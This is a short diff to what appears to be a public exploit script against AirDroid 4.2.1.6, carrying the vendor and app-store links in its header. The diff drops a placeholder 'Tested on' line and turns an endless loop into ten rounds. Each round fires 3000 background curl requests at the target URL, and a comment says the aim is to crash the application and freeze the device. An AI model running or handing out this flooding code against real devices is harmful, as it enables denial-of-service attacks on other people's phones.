@@ -11,7 +11,6 @@
 # Vendor Homepage: https://web.airdroid.com/
 # Software Link: https://play.google.com/store/apps/details?id=com.sand.airdroid&hl=en
 # Version: AirDroid 4.2.1.6
-# Tested on: [relevant os]
 
 #Colours
 greenColour="\e[0;32m\033[1m"
@@ -80,7 +79,7 @@ if [ "$(echo $#)" == "2" ]; then
 		counter=0
 
 		# Start launch attack of the message boxes, so the Application crash and the device freezes
-		tput civis && while true; do
+		tput civis && for i in $(seq 1 10); do
 			for i in $(seq 1 3000); do
 				curl --silent "$url" &
 				let counter+=1
